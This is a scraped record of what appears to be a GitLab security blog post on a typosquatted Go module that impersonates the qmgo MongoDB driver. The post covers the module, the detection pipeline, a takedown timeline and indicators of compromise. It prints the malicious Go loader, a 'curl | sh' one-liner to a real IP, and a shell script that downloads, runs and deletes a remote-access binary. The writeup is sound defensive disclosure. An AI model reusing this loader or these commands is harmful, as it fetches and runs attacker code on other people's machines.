{
  "id": "d27db941-2966-4919-92d7-f6bf3b3665bf",
  "title": "GitLab catches MongoDB Go module supply chain attack",
  "link": "https://about.gitlab.com/blog/gitlab-catches-mongodb-go-module-supply-chain-attack/",
  "description": "",
  "author": "Michael Henriksen",
  "published": "2025-06-30T00:00:00.000Z",
  "source": "https://about.gitlab.com/atom.xml",
  "categories": null,
  "byline": "Michael Henriksen",
  "length": 10109,
  "excerpt": "Learn how GitLab detected a supply chain attack targeting Go developers through fake MongoDB drivers that deploy persistent backdoor malware.",
  "siteName": "GitLab",
  "favicon": "https://about.gitlab.com/images/ico/favicon-192x192.png",
  "text": "Software supply chain attacks via malicious dependencies continue to be one of the most significant security threats to modern software development. The widespread use of open source components has enabled development teams to build applications rapidly, but it has also widened the attack surface area. The growing ecosystem of third-party packages presents numerous opportunities for attackers to exploit dependencies through techniques like typosquatting, dependency confusion, and package impersonation, making it increasingly challenging for developers to distinguish legitimate packages from malicious imposters. To address this challenge, GitLab's Vulnerability Research team recently developed an automated detection system designed to proactively identify malicious dependencies in software supply chains. The system combines multiple detection techniques that work in concert: Automated typosquatting detection, which identifies suspicious naming patterns Semantic code analysis, which flags potentially malicious behaviors like network requests or command executions AI-assisted initial screening for advanced payload and obfuscation detection This multi-layered approach is used by the vulnerability research team to continuously scan newly published dependencies across major ecosystems, providing early warning of supply chain attacks. Using this detection system, GitLab recently identified a live typosquatting attack in the wild that leveraged a malicious MongoDB Go module. Below are details on the attack and how GitLab works to keep supply chains safe. Executive summary: A MongoDB module that's not quite right Our detection system flagged a newly published Go module called github.com/qiniiu/qmgo, closely mimicking the popular MongoDB module github.com/qiniu/qmgo. The legitimate module describes itself as \"The Go driver for MongoDB\" and has gained traction in the Go community. To disguise the malicious module as legitimate, the threat actor used a GitHub username nearly identical to the one associated with the real module with one subtle change: they added one “i” (qiniu → qiniiu). To the casual observer scrolling through search results or auto-complete suggestions, this difference would be very easy to overlook. The new module’s code was a working copy of the legitimate qmgo module. However, malicious code was inserted into the NewClient function in client.go, a function that developers would naturally call when initializing their MongoDB connection. Concealing malicious code within a function made the payload less likely to be executed during potential runtime security analysis, while ensuring that it would execute from normal usage in real applications. After reporting the malicious module, it was removed within approximately 19 hours of our initial report. However, the threat actor quickly adapted, publishing a second typosquatted version (github.com/qiiniu/qmgo) just four days later with identical malicious code. This follow-up attack was also detected and taken down roughly one hour after initial discovery. The rapid redeployment demonstrates the persistent nature of these attacks and highlights why proactive detection is crucial in minimizing exposure windows. Technical deep dive: Peeling back the layers The threat actor took steps to hide the attack. The malicious payload used a multilayered approach, starting with a compact code snippet that triggered a chain of remote payload downloads: txt, err := script.Get(\"https://raw.githubusercontent.com/qiiniu/vue-element-admin/refs/heads/main/public/update.html\").String() if err == nil { txt2, err := script.Get(string(strings.Replace(txt, \"\\n\", \"\", -1))).String() if err == nil { exec.Command(\"/bin/sh\", \"-c\", string(txt2)).Start() } } The attack unfolds in four distinct layers: Layer 1: The code fetches update.html from another repository owned by the typosquat account qiiniu/vue-element-admin. The file contained a single line: https://img.googlex.cloud/seed.php Layer 2: The code then fetches https://img.googlex.cloud/seed.php, which returns a single shell command, which is executed: curl -s http://207.148.110.29:80/logon61.gif|sh Layer 3: The command tells the system to fetch http://207.148.110.29:80/logon61.gif using curl and execute the response as a shell script. The shell script downloads what appears to be an MP3 file (chainelli.mp3) to /tmp/vod, makes it executable, runs it, and immediately deletes it: #!/bin/sh rm -rf /tmp/vod curl -s http://207.148.110.29:80/chainelli.mp3 -o /tmp/vod chmod 777 /tmp/vod /tmp/vod rm -rf /tmp/vod Layer 4: The chainelli.mp3 file is actually a statically-linked, stripped ELF Go binary designed to establish persistent remote access. Once executed, the malware attempts to connect to its command and control server at ellipal.spoolsv.cyou on Port 443 (both TCP and UDP), using a custom encrypted communication protocol with a hardcoded RSA key. From there, it provides the threat actor with remote administration capabilities: Complete remote shell access and one-off command execution Screenshot captures SOCKS proxy functionality to make connections through the compromised machine Configurable sleep interval between check-ins with the command and control server to avoid detection Standard remote access trojan features like filesystem browsing and upload/download They're back (already) Just four days after GitLab reported the initial malicious module and saw it removed, github.com/qiiniu/qmgo appeared – the second typosquatted version with identical malicious code. This quick redeployment demonstrates the persistent nature of these attacks and highlights how threat actors adapt quickly to takedown efforts. GitLab’s approach: Finding needles in haystacks The initial discovery and persistence of this attack validated our approach to proactive dependency monitoring and threat detection. GitLab’s detection system combines multiple techniques to identify malicious dependencies: Typosquatting detection: GitLab monitors newly published dependencies and looks for packages that exhibit signs of various typosquatting strategies. Semantic heuristics: Our system statically analyzes code for patterns like network requests, command executions, and other behaviors typical of malicious payloads. AI-assisted analysis: A large language model does the initial analysis of the suspicious parts of the code to help us weed out obvious false positives, detect complex payloads, and identify obfuscation techniques used to hide malicious intent. Human review: A human receives an alert to verify the finding and to perform advanced analysis. Recommendations: Staying ahead of persistent supply chain threats This attack highlights the ongoing challenges in securing software supply chains. The multilayered obfuscation and rapid redeployment after takedown demonstrate that threat actors are willing to invest significant effort in targeting popular dependencies. The quick pivot to new typosquatted packages after our initial report highlights a fundamental weakness in the current ecosystems: package managers typically only remove malicious dependencies after they've been published, discovered, and reported by the community. This reactive approach leaves a dangerous window where developers can unknowingly consume compromised packages. Proactive monitoring and detection systems like the one GitLab has developed can help close this gap by identifying threats during the publication process itself. We've provided indicators of compromise (IOCs) in the next section, which you can use in your monitoring systems to detect this specific campaign. Indicators of compromise IOC Description github.com/qiniiu/qmgo Malicious Go module github.com/qiiniu/qmgo Malicious Go module https://raw.githubusercontent.com/qiniiu/vue-element-admin/refs/heads/main/public/update.html Payload delivery URL https://raw.githubusercontent.com/qiiniu/vue-element-admin/refs/heads/main/public/update.html Payload delivery URL https://img.googlex.cloud/seed.php Payload delivery URL http://207.148.110.29:80/logon61.gif Payload delivery URL http://207.148.110.29:80/chainelli.mp3 Payload delivery URL img.googlex.cloud Payload delivery host 207.148.110.29 Payload delivery host ellipal.spoolsv.cyou Command \u0026 Control host 6ada952c592f286692c59028c5e0fc3fa589759f SHA-1 checksum of chainelli.mp3 remote administration malware 8ae533e2d1d89c871908cbcf5c7d89c433d09b2e7f7d4ade3aef46c55b66509c SHA-256 checksum of chainelli.mp3 remote administration malware /tmp/vod Temporary download location of chainelli.mp3 remote administration malware How GitLab helps secure the software supply chain Malicious dependencies, like the MongoDB Go module attack, highlight why securing the software supply chain requires more than just CVE monitoring. GitLab’s DevSecOps platform includes Application Security Testing scanners like Software Composition Analysis in the development lifecycle, helping teams catch vulnerable or malicious packages before they reach production. Paired with research efforts like this, GitLab aims to enable developers to build applications that are secure from the start without compromising on development velocity. Timeline 2025-06-01T09:31: GitLab reports github.com/qiniiu/qmgo to Go Security 2025-06-01T09:43: GitLab reports github.com/qiniiu/qmgo to GitHub 2025-06-01T10:14: GitLab reports ellipal.spoolsv.cyou (188.166.213.194) to the IP block owner 2025-06-02T04:03: Go Security takes down github.com/qiniiu/qmgo 2025-06-02T09:57: The IP block owner suspends 188.166.213.194 2025-06-03T09:15: GitHub suspends github.com/qiniiu 2025-06-05T17:15: GitLab reports github.com/qiiniu/qmgo to Go Security 2025-06-05T17:33: GitLab reports github.com/qiiniu/qmgo to GitHub 2025-06-05T17:45: Go Security takes down github.com/qiiniu/qmgo 2025-06-06T12:25: GitHub suspends github.com/qiiniu",
  "image": "https://about.gitlab.com/images/open-graph/open-graph-gitlab.png",
  "html": "\u003cdiv id=\"readability-page-1\" class=\"page\"\u003e\u003cdiv data-v-c4ab8db4=\"\" data-v-69df7a1a=\"\" data-v-b7392a61=\"\"\u003e\u003cp\u003eSoftware supply chain attacks via malicious dependencies continue to be one of the most significant security threats to modern software development. The widespread use of open source components has enabled development teams to build applications rapidly, but it has also widened the attack surface area. The growing ecosystem of third-party packages presents numerous opportunities for attackers to exploit dependencies through techniques like typosquatting, dependency confusion, and package impersonation, making it increasingly challenging for developers to distinguish legitimate packages from malicious imposters.\u003c/p\u003e\n\u003cp\u003eTo address this challenge, GitLab\u0026#39;s Vulnerability Research team recently developed an automated detection system designed to proactively identify malicious dependencies in software supply chains. The system combines multiple detection techniques that work in concert:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eAutomated typosquatting detection, which identifies suspicious naming patterns\u003c/li\u003e\n\u003cli\u003eSemantic code analysis, which flags potentially malicious behaviors like network requests or command executions\u003c/li\u003e\n\u003cli\u003eAI-assisted initial screening for advanced payload and obfuscation detection\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eThis multi-layered approach is used by the vulnerability research team to continuously scan newly published dependencies across major ecosystems, providing early warning of supply chain attacks.\u003c/p\u003e\n\u003cp\u003eUsing this detection system, GitLab recently identified a live typosquatting attack in the wild that leveraged a malicious MongoDB Go module. Below are details on the attack and how GitLab works to keep supply chains safe.\u003c/p\u003e\n\u003ch2 id=\"executive-summary-a-mongodb-module-that\u0026#39;s-not-quite-right\" tabindex=\"-1\"\u003eExecutive summary: A MongoDB module that\u0026#39;s not quite right \u003ca href=\"#executive-summary-a-mongodb-module-that\u0026#39;s-not-quite-right\"\u003e\n          \u003csvg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"\u003e\u003cpath d=\"M12.2426 3.75736C11.4615 2.97631 10.1952 2.97631 9.41416 3.75736L7.99995 5.17157C7.60942 5.56209 6.97626 5.56209 6.58573 5.17157C6.19521 4.78105 6.19521 4.14788 6.58573 3.75736L7.99995 2.34314C9.56205 0.781046 12.0947 0.781046 13.6568 2.34314C15.2189 3.90524 15.2189 6.4379 13.6568 8L12.2426 9.41421C11.8521 9.80473 11.2189 9.80473 10.8284 9.41421C10.4379 9.02369 10.4379 8.39052 10.8284 8L12.2426 6.58578C13.0236 5.80473 13.0236 4.5384 12.2426 3.75736Z\" fill=\"#333333\"\u003e\u003c/path\u003e\u003cpath d=\"M10.5355 5.4645C10.926 5.85502 10.926 6.48819 10.5355 6.87871L6.87863 10.5356C6.4881 10.9261 5.85494 10.9261 5.46441 10.5356C5.07389 10.145 5.07389 9.51188 5.46441 9.12135L9.12127 5.4645C9.51179 5.07397 10.145 5.07397 10.5355 5.4645Z\" fill=\"#333333\"\u003e\u003c/path\u003e\u003cpath d=\"M3.75742 9.41422C2.97637 10.1953 2.97637 11.4616 3.75742 12.2426C4.53847 13.0237 5.8048 13.0237 6.58584 12.2426L8.00006 10.8284C8.39058 10.4379 9.02375 10.4379 9.41427 10.8284C9.8048 11.219 9.8048 11.8521 9.41427 12.2426L8.00006 13.6569C6.43796 15.219 3.9053 15.219 2.3432 13.6569C0.781107 12.0948 0.781107 9.56211 2.3432 8.00001L3.75742 6.5858C4.14794 6.19527 4.78111 6.19527 5.17163 6.5858C5.56216 6.97632 5.56215 7.60948 5.17163 8.00001L3.75742 9.41422Z\" fill=\"#333333\"\u003e\u003c/path\u003e\u003c/svg\u003e\n        \u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003eOur detection system flagged a newly published Go module called \u003ccode\u003egithub.com/qiniiu/qmgo\u003c/code\u003e, closely mimicking the popular \u003ca href=\"https://www.mongodb.com/\"\u003eMongoDB\u003c/a\u003e module \u003ccode\u003egithub.com/qiniu/qmgo\u003c/code\u003e. The legitimate module describes itself as \u0026#34;The Go driver for MongoDB\u0026#34; and has gained traction in the Go community.\u003c/p\u003e\n\u003cp\u003eTo disguise the malicious module as legitimate, the threat actor used a GitHub username nearly identical to the one associated with the real module with one subtle change: they added one “i” (\u003ccode\u003eqiniu\u003c/code\u003e → \u003ccode\u003eqiniiu\u003c/code\u003e). To the casual observer scrolling through search results or auto-complete suggestions, this difference would be very easy to overlook.\u003c/p\u003e\n\u003cp\u003eThe new module’s code was a working copy of the legitimate \u003ccode\u003eqmgo\u003c/code\u003e module. However, malicious code was inserted into the \u003ccode\u003eNewClient\u003c/code\u003e function in \u003ccode\u003eclient.go\u003c/code\u003e, a function that developers would naturally call when initializing their MongoDB connection. Concealing malicious code within a function made the payload less likely to be executed during potential runtime security analysis, while ensuring that it would execute from normal usage in real applications.\u003c/p\u003e\n\u003cp\u003eAfter reporting the malicious module, it was removed within approximately 19 hours of our initial report. However, the threat actor quickly adapted, publishing a second typosquatted version (\u003ccode\u003egithub.com/qiiniu/qmgo\u003c/code\u003e) just four days later with identical malicious code. This follow-up attack was also detected and taken down roughly one hour after initial discovery. The rapid redeployment demonstrates the persistent nature of these attacks and highlights why proactive detection is crucial in minimizing exposure windows.\u003c/p\u003e\n\u003ch2 id=\"technical-deep-dive-peeling-back-the-layers\" tabindex=\"-1\"\u003eTechnical deep dive: Peeling back the layers \u003ca href=\"#technical-deep-dive-peeling-back-the-layers\"\u003e\n          \u003csvg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"\u003e\u003cpath d=\"M12.2426 3.75736C11.4615 2.97631 10.1952 2.97631 9.41416 3.75736L7.99995 5.17157C7.60942 5.56209 6.97626 5.56209 6.58573 5.17157C6.19521 4.78105 6.19521 4.14788 6.58573 3.75736L7.99995 2.34314C9.56205 0.781046 12.0947 0.781046 13.6568 2.34314C15.2189 3.90524 15.2189 6.4379 13.6568 8L12.2426 9.41421C11.8521 9.80473 11.2189 9.80473 10.8284 9.41421C10.4379 9.02369 10.4379 8.39052 10.8284 8L12.2426 6.58578C13.0236 5.80473 13.0236 4.5384 12.2426 3.75736Z\" fill=\"#333333\"\u003e\u003c/path\u003e\u003cpath d=\"M10.5355 5.4645C10.926 5.85502 10.926 6.48819 10.5355 6.87871L6.87863 10.5356C6.4881 10.9261 5.85494 10.9261 5.46441 10.5356C5.07389 10.145 5.07389 9.51188 5.46441 9.12135L9.12127 5.4645C9.51179 5.07397 10.145 5.07397 10.5355 5.4645Z\" fill=\"#333333\"\u003e\u003c/path\u003e\u003cpath d=\"M3.75742 9.41422C2.97637 10.1953 2.97637 11.4616 3.75742 12.2426C4.53847 13.0237 5.8048 13.0237 6.58584 12.2426L8.00006 10.8284C8.39058 10.4379 9.02375 10.4379 9.41427 10.8284C9.8048 11.219 9.8048 11.8521 9.41427 12.2426L8.00006 13.6569C6.43796 15.219 3.9053 15.219 2.3432 13.6569C0.781107 12.0948 0.781107 9.56211 2.3432 8.00001L3.75742 6.5858C4.14794 6.19527 4.78111 6.19527 5.17163 6.5858C5.56216 6.97632 5.56215 7.60948 5.17163 8.00001L3.75742 9.41422Z\" fill=\"#333333\"\u003e\u003c/path\u003e\u003c/svg\u003e\n        \u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003eThe threat actor took steps to hide the attack. The malicious payload used a multilayered approach, starting with a compact code snippet that triggered a chain of remote payload downloads:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003etxt, err := script.Get(\u0026#34;https://raw.githubusercontent.com/qiiniu/vue-element-admin/refs/heads/main/public/update.html\u0026#34;).String()  \nif err == nil {  \n    txt2, err := script.Get(string(strings.Replace(txt, \u0026#34;\\n\u0026#34;, \u0026#34;\u0026#34;, -1))).String()  \n    if err == nil {  \n        exec.Command(\u0026#34;/bin/sh\u0026#34;, \u0026#34;-c\u0026#34;, string(txt2)).Start()  \n    }  \n}  \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe attack unfolds in four distinct layers:\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eLayer 1:\u003c/strong\u003e The code fetches \u003ccode\u003eupdate.html\u003c/code\u003e from another repository owned by the typosquat account \u003ccode\u003eqiiniu/vue-element-admin\u003c/code\u003e. The file contained a single line:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003ehttps://img.googlex.cloud/seed.php\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eLayer 2:\u003c/strong\u003e The code then fetches \u003ccode\u003ehttps://img.googlex.cloud/seed.php\u003c/code\u003e, which returns a single shell command, which is executed:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003ecurl -s http://207.148.110.29:80/logon61.gif|sh\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eLayer 3:\u003c/strong\u003e The command tells the system to fetch \u003ccode\u003ehttp://207.148.110.29:80/logon61.gif\u003c/code\u003e using curl and execute the response as a shell script.  The shell script downloads what appears to be an MP3 file (\u003ccode\u003echainelli.mp3\u003c/code\u003e) to \u003ccode\u003e/tmp/vod\u003c/code\u003e, makes it executable, runs it, and immediately deletes it:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e#!/bin/sh  \nrm -rf /tmp/vod  \ncurl -s http://207.148.110.29:80/chainelli.mp3 -o /tmp/vod  \nchmod 777 /tmp/vod  \n/tmp/vod  \nrm -rf /tmp/vod  \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eLayer 4:\u003c/strong\u003e The \u003ccode\u003echainelli.mp3\u003c/code\u003e file is actually a statically-linked, stripped ELF Go binary designed to establish persistent remote access. Once executed, the malware attempts to connect to its command and control server at \u003ccode\u003eellipal.spoolsv.cyou\u003c/code\u003e on Port 443 (both TCP and UDP), using a custom encrypted communication protocol with a hardcoded RSA key. From there, it provides the threat actor with remote administration capabilities:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eComplete remote shell access and one-off command execution\u003c/li\u003e\n\u003cli\u003eScreenshot captures\u003c/li\u003e\n\u003cli\u003eSOCKS proxy functionality to make connections through the compromised machine\u003c/li\u003e\n\u003cli\u003eConfigurable sleep interval between check-ins with the command and control server to avoid detection\u003c/li\u003e\n\u003cli\u003eStandard remote access trojan features like filesystem browsing and upload/download\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"they\u0026#39;re-back-(already)\" tabindex=\"-1\"\u003eThey\u0026#39;re back (already) \u003ca href=\"#they\u0026#39;re-back-(already)\"\u003e\n          \u003csvg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"\u003e\u003cpath d=\"M12.2426 3.75736C11.4615 2.97631 10.1952 2.97631 9.41416 3.75736L7.99995 5.17157C7.60942 5.56209 6.97626 5.56209 6.58573 5.17157C6.19521 4.78105 6.19521 4.14788 6.58573 3.75736L7.99995 2.34314C9.56205 0.781046 12.0947 0.781046 13.6568 2.34314C15.2189 3.90524 15.2189 6.4379 13.6568 8L12.2426 9.41421C11.8521 9.80473 11.2189 9.80473 10.8284 9.41421C10.4379 9.02369 10.4379 8.39052 10.8284 8L12.2426 6.58578C13.0236 5.80473 13.0236 4.5384 12.2426 3.75736Z\" fill=\"#333333\"\u003e\u003c/path\u003e\u003cpath d=\"M10.5355 5.4645C10.926 5.85502 10.926 6.48819 10.5355 6.87871L6.87863 10.5356C6.4881 10.9261 5.85494 10.9261 5.46441 10.5356C5.07389 10.145 5.07389 9.51188 5.46441 9.12135L9.12127 5.4645C9.51179 5.07397 10.145 5.07397 10.5355 5.4645Z\" fill=\"#333333\"\u003e\u003c/path\u003e\u003cpath d=\"M3.75742 9.41422C2.97637 10.1953 2.97637 11.4616 3.75742 12.2426C4.53847 13.0237 5.8048 13.0237 6.58584 12.2426L8.00006 10.8284C8.39058 10.4379 9.02375 10.4379 9.41427 10.8284C9.8048 11.219 9.8048 11.8521 9.41427 12.2426L8.00006 13.6569C6.43796 15.219 3.9053 15.219 2.3432 13.6569C0.781107 12.0948 0.781107 9.56211 2.3432 8.00001L3.75742 6.5858C4.14794 6.19527 4.78111 6.19527 5.17163 6.5858C5.56216 6.97632 5.56215 7.60948 5.17163 8.00001L3.75742 9.41422Z\" fill=\"#333333\"\u003e\u003c/path\u003e\u003c/svg\u003e\n        \u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003eJust four days after GitLab reported the initial malicious module and saw it removed, \u003ccode\u003egithub.com/qiiniu/qmgo\u003c/code\u003e appeared – the second typosquatted version with identical malicious code. This quick redeployment demonstrates the persistent nature of these attacks and highlights how threat actors adapt quickly to takedown efforts.\u003c/p\u003e\n\u003ch2 id=\"gitlab%E2%80%99s-approach-finding-needles-in-haystacks\" tabindex=\"-1\"\u003eGitLab’s approach: Finding needles in haystacks \u003ca href=\"#gitlab%E2%80%99s-approach-finding-needles-in-haystacks\"\u003e\n          \u003csvg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"\u003e\u003cpath d=\"M12.2426 3.75736C11.4615 2.97631 10.1952 2.97631 9.41416 3.75736L7.99995 5.17157C7.60942 5.56209 6.97626 5.56209 6.58573 5.17157C6.19521 4.78105 6.19521 4.14788 6.58573 3.75736L7.99995 2.34314C9.56205 0.781046 12.0947 0.781046 13.6568 2.34314C15.2189 3.90524 15.2189 6.4379 13.6568 8L12.2426 9.41421C11.8521 9.80473 11.2189 9.80473 10.8284 9.41421C10.4379 9.02369 10.4379 8.39052 10.8284 8L12.2426 6.58578C13.0236 5.80473 13.0236 4.5384 12.2426 3.75736Z\" fill=\"#333333\"\u003e\u003c/path\u003e\u003cpath d=\"M10.5355 5.4645C10.926 5.85502 10.926 6.48819 10.5355 6.87871L6.87863 10.5356C6.4881 10.9261 5.85494 10.9261 5.46441 10.5356C5.07389 10.145 5.07389 9.51188 5.46441 9.12135L9.12127 5.4645C9.51179 5.07397 10.145 5.07397 10.5355 5.4645Z\" fill=\"#333333\"\u003e\u003c/path\u003e\u003cpath d=\"M3.75742 9.41422C2.97637 10.1953 2.97637 11.4616 3.75742 12.2426C4.53847 13.0237 5.8048 13.0237 6.58584 12.2426L8.00006 10.8284C8.39058 10.4379 9.02375 10.4379 9.41427 10.8284C9.8048 11.219 9.8048 11.8521 9.41427 12.2426L8.00006 13.6569C6.43796 15.219 3.9053 15.219 2.3432 13.6569C0.781107 12.0948 0.781107 9.56211 2.3432 8.00001L3.75742 6.5858C4.14794 6.19527 4.78111 6.19527 5.17163 6.5858C5.56216 6.97632 5.56215 7.60948 5.17163 8.00001L3.75742 9.41422Z\" fill=\"#333333\"\u003e\u003c/path\u003e\u003c/svg\u003e\n        \u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003eThe initial discovery and persistence of this attack validated our approach to proactive dependency monitoring and threat detection. GitLab’s detection system combines multiple techniques to identify malicious dependencies:\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eTyposquatting detection:\u003c/strong\u003e GitLab monitors newly published dependencies and looks for packages that exhibit signs of various typosquatting strategies.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eSemantic heuristics:\u003c/strong\u003e Our system statically analyzes code for patterns like network requests, command executions, and other behaviors typical of malicious payloads.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eAI-assisted analysis:\u003c/strong\u003e A \u003ca href=\"https://about.gitlab.com/blog/what-is-a-large-language-model-llm/\"\u003elarge language model\u003c/a\u003e does the initial analysis of the suspicious parts of the code to help us weed out obvious false positives, detect complex payloads, and identify obfuscation techniques used to hide malicious intent.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eHuman review:\u003c/strong\u003e A human receives an alert to verify the finding and to perform advanced analysis.\u003c/p\u003e\n\u003ch2 id=\"recommendations-staying-ahead-of-persistent-supply-chain-threats\" tabindex=\"-1\"\u003eRecommendations: Staying ahead of persistent supply chain threats \u003ca href=\"#recommendations-staying-ahead-of-persistent-supply-chain-threats\"\u003e\n          \u003csvg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"\u003e\u003cpath d=\"M12.2426 3.75736C11.4615 2.97631 10.1952 2.97631 9.41416 3.75736L7.99995 5.17157C7.60942 5.56209 6.97626 5.56209 6.58573 5.17157C6.19521 4.78105 6.19521 4.14788 6.58573 3.75736L7.99995 2.34314C9.56205 0.781046 12.0947 0.781046 13.6568 2.34314C15.2189 3.90524 15.2189 6.4379 13.6568 8L12.2426 9.41421C11.8521 9.80473 11.2189 9.80473 10.8284 9.41421C10.4379 9.02369 10.4379 8.39052 10.8284 8L12.2426 6.58578C13.0236 5.80473 13.0236 4.5384 12.2426 3.75736Z\" fill=\"#333333\"\u003e\u003c/path\u003e\u003cpath d=\"M10.5355 5.4645C10.926 5.85502 10.926 6.48819 10.5355 6.87871L6.87863 10.5356C6.4881 10.9261 5.85494 10.9261 5.46441 10.5356C5.07389 10.145 5.07389 9.51188 5.46441 9.12135L9.12127 5.4645C9.51179 5.07397 10.145 5.07397 10.5355 5.4645Z\" fill=\"#333333\"\u003e\u003c/path\u003e\u003cpath d=\"M3.75742 9.41422C2.97637 10.1953 2.97637 11.4616 3.75742 12.2426C4.53847 13.0237 5.8048 13.0237 6.58584 12.2426L8.00006 10.8284C8.39058 10.4379 9.02375 10.4379 9.41427 10.8284C9.8048 11.219 9.8048 11.8521 9.41427 12.2426L8.00006 13.6569C6.43796 15.219 3.9053 15.219 2.3432 13.6569C0.781107 12.0948 0.781107 9.56211 2.3432 8.00001L3.75742 6.5858C4.14794 6.19527 4.78111 6.19527 5.17163 6.5858C5.56216 6.97632 5.56215 7.60948 5.17163 8.00001L3.75742 9.41422Z\" fill=\"#333333\"\u003e\u003c/path\u003e\u003c/svg\u003e\n        \u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003eThis attack highlights the ongoing challenges in securing software supply chains. The multilayered obfuscation and rapid redeployment after takedown demonstrate that threat actors are willing to invest significant effort in targeting popular dependencies.\u003c/p\u003e\n\u003cp\u003eThe quick pivot to new typosquatted packages after our initial report highlights a fundamental weakness in the current ecosystems: package managers typically only remove malicious dependencies after they\u0026#39;ve been published, discovered, and reported by the community. This reactive approach leaves a dangerous window where developers can unknowingly consume compromised packages. Proactive monitoring and detection systems like the one GitLab has developed can help close this gap by identifying threats during the publication process itself.\u003c/p\u003e\n\u003cp\u003eWe\u0026#39;ve provided indicators of compromise (IOCs) in the next section, which you can use in your monitoring systems to detect this specific campaign.\u003c/p\u003e\n\u003ch2 id=\"indicators-of-compromise\" tabindex=\"-1\"\u003eIndicators of compromise \u003ca href=\"#indicators-of-compromise\"\u003e\n          \u003csvg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"\u003e\u003cpath d=\"M12.2426 3.75736C11.4615 2.97631 10.1952 2.97631 9.41416 3.75736L7.99995 5.17157C7.60942 5.56209 6.97626 5.56209 6.58573 5.17157C6.19521 4.78105 6.19521 4.14788 6.58573 3.75736L7.99995 2.34314C9.56205 0.781046 12.0947 0.781046 13.6568 2.34314C15.2189 3.90524 15.2189 6.4379 13.6568 8L12.2426 9.41421C11.8521 9.80473 11.2189 9.80473 10.8284 9.41421C10.4379 9.02369 10.4379 8.39052 10.8284 8L12.2426 6.58578C13.0236 5.80473 13.0236 4.5384 12.2426 3.75736Z\" fill=\"#333333\"\u003e\u003c/path\u003e\u003cpath d=\"M10.5355 5.4645C10.926 5.85502 10.926 6.48819 10.5355 6.87871L6.87863 10.5356C6.4881 10.9261 5.85494 10.9261 5.46441 10.5356C5.07389 10.145 5.07389 9.51188 5.46441 9.12135L9.12127 5.4645C9.51179 5.07397 10.145 5.07397 10.5355 5.4645Z\" fill=\"#333333\"\u003e\u003c/path\u003e\u003cpath d=\"M3.75742 9.41422C2.97637 10.1953 2.97637 11.4616 3.75742 12.2426C4.53847 13.0237 5.8048 13.0237 6.58584 12.2426L8.00006 10.8284C8.39058 10.4379 9.02375 10.4379 9.41427 10.8284C9.8048 11.219 9.8048 11.8521 9.41427 12.2426L8.00006 13.6569C6.43796 15.219 3.9053 15.219 2.3432 13.6569C0.781107 12.0948 0.781107 9.56211 2.3432 8.00001L3.75742 6.5858C4.14794 6.19527 4.78111 6.19527 5.17163 6.5858C5.56216 6.97632 5.56215 7.60948 5.17163 8.00001L3.75742 9.41422Z\" fill=\"#333333\"\u003e\u003c/path\u003e\u003c/svg\u003e\n        \u003c/a\u003e\u003c/h2\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eIOC\u003c/th\u003e\n\u003cth\u003eDescription\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003egithub.com/qiniiu/qmgo\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eMalicious Go module\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003egithub.com/qiiniu/qmgo\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eMalicious Go module\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003ehttps://raw.githubusercontent.com/qiniiu/vue-element-admin/refs/heads/main/public/update.html\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003ePayload delivery URL\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003ehttps://raw.githubusercontent.com/qiiniu/vue-element-admin/refs/heads/main/public/update.html\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003ePayload delivery URL\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003ehttps://img.googlex.cloud/seed.php\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003ePayload delivery URL\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003ehttp://207.148.110.29:80/logon61.gif\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003ePayload delivery 